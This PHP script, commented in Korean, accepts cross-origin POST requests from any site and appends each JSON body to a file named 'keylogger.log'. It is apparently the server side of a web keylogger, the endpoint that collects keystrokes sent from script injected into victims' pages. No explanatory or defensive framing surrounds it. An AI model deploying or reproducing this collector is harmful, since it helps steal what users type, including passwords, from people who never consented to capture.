<?php
    // CORS 허용
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Headers: Content-Type");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit;
    }
    
    $json = file_get_contents("php://input");
    file_put_contents('keylogger.log', $json . "\n", FILE_APPEND);
?>